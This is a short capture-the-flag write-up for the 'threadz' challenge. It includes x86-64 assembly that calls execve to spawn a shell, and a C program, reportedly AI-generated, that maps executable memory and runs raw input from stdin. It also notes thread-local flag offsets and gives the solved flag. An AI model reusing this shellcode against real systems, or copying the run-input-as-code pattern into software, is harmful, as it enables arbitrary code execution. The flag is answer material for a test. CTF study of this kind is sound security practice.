# threadz

This ctf just wants us to inject assembly code to get the flag.
I tried to do a payload do make a syscall to get shell:
```c
push rbp
mov rbp, rsp
sub rsp, 0x8

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
leave
ret
```
No luck tho.
So I asked the AI to generate me a `C` code that could resemble what was in the ctf's description. It gave me this:
```c
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

volatile __thread unsigned int flag1 = 'CTF{';
volatile __thread unsigned int flag2 = 'FAKE';
volatile __thread unsigned int flag3 = 'FLAG';
volatile __thread unsigned int flag4 = '}l00';

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    void *shellcode = mmap(
        NULL,
        0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        0,
        0
    );
    if (shellcode == MAP_FAILED) {
        exit(1);
    }
    read(STDIN_FILENO, shellcode, 0x1000);
    ((void (*)())shellcode)();
    munmap(shellcode, 0x1000);
}
``` 

So after dubugging on local I found out that the first flag part is at address `fs:0xffffffffffffffe8` and the next one at `+4` of it.
So I tried on remote and got a partial flag.
After testig with more addresses I found that the first 6 addresses are the flag.

Exploit:
![exploit](threadz-exploit.py)

![leakcode](threadz-leakcode.asm)

flag: `TFCCTF{Thr34dZ_4r3_c00l}`